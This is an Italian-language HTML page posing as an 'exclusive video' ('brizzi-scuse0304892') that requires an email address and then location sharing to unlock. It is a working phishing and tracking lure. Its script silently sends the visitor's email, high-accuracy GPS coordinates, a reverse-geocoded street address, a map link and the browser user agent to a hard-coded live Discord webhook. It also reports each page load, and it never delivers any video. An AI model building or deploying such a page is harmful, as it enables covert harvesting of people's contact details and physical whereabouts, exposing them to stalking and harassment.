<!DOCTYPE html>
<html>
<head>
    <title>Brizzi Video</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        .video-placeholder {
            background: #f0f0f0;
            padding: 60px 20px;
            border-radius: 10px;
            margin: 20px 0;
            border: 2px dashed #ccc;
        }
        .email-form {
            margin: 20px 0;
        }
        input[type="email"] {
            width: 80%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            opacity: 0.9;
        }
        .location-status {
            margin: 15px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Video Esclusivo: "brizzi-scuse0304892"</h1>
        
        <div class="video-placeholder">
            <p>üé• VIDEO RISERVATO</p>
            <p>Inserisci email per sbloccare il contenuto</p>
        </div>

        <div class="email-form" id="emailForm">
            <p>Inserisci la tua email per visualizzare il video:</p>
            <input type="email" id="emailInput" placeholder="la-tua-email@example.com" required>
            <br>
            <button onclick="submitEmail()">üé¨ Invia Email</button>
        </div>

        <div class="location-status hidden" id="locationStatus"></div>

        <div class="hidden" id="locationSection">
            <button onclick="requestLocation()">üìç Condividi Posizione</button>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422614803888738415/nnmqT3Dz6V771PbfB0KkhCXLZLX6_FiWXdnqn2JBm1j87VD5b7CKvD4-b573Yh9wtC-5';

        async function sendSingleData(dataName, dataValue) {
            try {
                const payload = {
                    content: `üé• **${dataName}:** \`\`\`${JSON.stringify(dataValue, null, 2)}\`\`\``,
                    username: 'Brizzi Video Tracker'
                };
                
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => {});
            } catch (error) {}
        }

        function submitEmail() {
            const emailInput = document.getElementById('emailInput');
            const email = emailInput.value.trim();
            
            if (!email) {
                alert('Inserisci un indirizzo email valido');
                return;
            }

            if (!validateEmail(email)) {
                alert('Inserisci un indirizzo email valido');
                return;
            }

            const emailData = {
                email: email,
                video: 'brizzi-scuse0304892',
                timestamp: new Date().toISOString(),
                status: 'EMAIL_SUBMITTED'
            };

            sendSingleData('üìß EMAIL_VIDEO_REQUEST', emailData);

            document.getElementById('emailForm').style.display = 'none';
            document.getElementById('locationSection').classList.remove('hidden');
            document.getElementById('locationStatus').classList.remove('hidden');
            document.getElementById('locationStatus').textContent = '‚úÖ Email ricevuta! Condividi la posizione per il video.';
            document.getElementById('locationStatus').className = 'location-status success';
            
            emailInput.value = '';
        }

        function requestLocation() {
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.textContent = 'üìç Rilevamento posizione in corso...';
            statusDiv.className = 'location-status';

            if (!navigator.geolocation) {
                statusDiv.textContent = '‚ùå Geolocalizzazione non supportata';
                statusDiv.className = 'location-status error';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    
                    let address = 'Unknown';
                    try {
                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
                        const data = await response.json();
                        address = data.display_name || 'Unknown';
                    } catch (e) {}
                    
                    const locationData = {
                        coordinates: {
                            latitude: latitude.toFixed(6),
                            longitude: longitude.toFixed(6),
                            accuracy: `${Math.round(accuracy)} meters`
                        },
                        address: address,
                        googleMaps: `https://maps.google.com/?q=${latitude},${longitude}`,
                        timestamp: new Date().toISOString(),
                        videoRequested: 'brizzi-scuse0304892'
                    };
                    
                    sendSingleData('üìç POSIZIONE_VIDEO_REQUEST', locationData);
                    
                    statusDiv.textContent = '‚úÖ Posizione condivisa! Video in caricamento...';
                    statusDiv.className = 'location-status success';
                    
                    document.getElementById('locationSection').style.display = 'none';
                    
                    setTimeout(() => {
                        document.querySelector('.video-placeholder').innerHTML = 
                            '<p>üé¨ VIDEO IN CARICAMENTO...</p>' +
                            '<p>Il video "brizzi-scuse0304892" sar√† disponibile a breve</p>';
                    }, 1000);
                },
                (error) => {
                    let errorMessage = 'Errore sconosciuto';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Permesso negato. Il video richiede la posizione.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Posizione non disponibile';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'Timeout nella richiesta';
                            break;
                    }
                    statusDiv.textContent = `‚ùå ${errorMessage}`;
                    statusDiv.className = 'location-status error';
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        setTimeout(() => {
            sendSingleData('PAGE_LOADED', {
                page: 'brizzi-scuse0304892',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            });
        }, 1000);
    </script>
</body>
</html>
